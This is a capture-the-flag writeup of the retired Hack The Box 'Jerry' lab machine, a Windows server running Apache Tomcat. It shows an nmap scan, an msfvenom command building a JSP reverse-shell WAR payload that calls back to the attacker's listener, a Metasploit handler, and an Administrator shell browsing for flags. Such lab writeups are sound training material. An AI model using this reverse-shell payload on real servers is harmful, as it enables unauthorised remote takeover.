I started to work on [Hack The Box](www.hackthebox.eu) machine in 2018. This is a writeup for the
retired [Jerry](https://www.hackthebox.eu/home/machines/profile/144) machine.

<!-- PELICAN_END_SUMMARY -->

# Hack the Box

In 2018 I started to play with [Hack the box](www.hackthebox.eu). The principle
is similar to the [vulnhub](https://www.vulnhub.com/about/) machines: You got a
VM and have to root it. The main difference is that you are connected to a VPN 
nd the machines are shared between the users. Also, there is only 20 "active" VM
at a time. At the moment there is a total of 128 VM and therefore 108 retired.
Finally, nobody is publishing Writeup before the VM is retired.

One of the Drawback is that I completely forgot to write and publish this
writeup.

The Jerry machine is Windows server. This VM is classified as a trivial one. In
fact it is a really easy one.

# Network discovery

As usual, we start with a simple network scan using nmap in order to scan the
open TCP ports: Only the port 8080 is open with an HTTP service.

    :::text
    root@kalili:~# nmap -p- 10.10.10.95 -sSV
    Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-03 17:38 CET
    Nmap scan report for 10.10.10.95
    Host is up (0.019s latency).
    Not shown: 65534 filtered ports
    PORT     STATE SERVICE VERSION
    8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 112.41 seconds

When going to this page we see a simple Tomcat Application Manager.

# Exploiting the administration interface

We generate a Java reverse shell payload using `msfvenom`:

    :::text
    root@kalili:~# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.14 LPORT=4444 -f war > reverse2.war

We start the handler using `metasploit`:

    :::text
    msf exploit(multi/handler) > use exploit/multi/handler 
    msf exploit(multi/handler) > show options 

    Module options (exploit/multi/handler):

      Name  Current Setting  Required  Description
      ----  ---------------  --------  -----------


    Payload options (java/jsp_shell_reverse_tcp):

      Name   Current Setting  Required  Description
      ----   ---------------  --------  -----------
      LHOST  10.10.15.14      yes       The listen address (an interface may be specified)
      LPORT  4444             yes       The listen port
      SHELL                   no        The system shell to use.


    Exploit target:

      Id  Name
      --  ----
      0   Wildcard Target

When running the War payload we got a shell as Administrator and we can start
listing the directories looking for the flags:

    :::text
    C:\apache-tomcat-7.0.88>dir c:\Users
    dir c:\Users
    Volume in drive C has no label.
    Volume Serial Number is FC2B-E489

    Directory of c:\Users

    06/18/2018  10:31 PM    <DIR>          .

    dir c:\Users\Administrator\Desktop\
    Volume in drive C has no label.

    Directory of c:\Users\Administrator\Desktop

    06/19/2018  06:09 AM    <DIR>          .

    06/19/2018  06:09 AM    <DIR>          flags
                  0 File(s)              0 bytes
                  3 Dir(s)  27,600,269,312 bytes free

    C:\apache-tomcat-7.0.88>dir c:\Users\Administrator\Desktop\flags
    dir c:\Users\Administrator\Desktop\flags
    Volume in drive C has no label.
    Volume Serial Number is FC2B-E489

As we already are administrator we can read the flag for the two level:

    :::text
    Directory of c:\Users\Administrator\Desktop\flags

    06/19/2018  06:09 AM    <DIR>          .
    06/19/2018  06:09 AM    <DIR>          ..
    06/19/2018  06:11 AM                88 2 for the price of 1.txt
                  1 File(s)             88 bytes
                  2 Dir(s)  27,600,269,312 bytes free
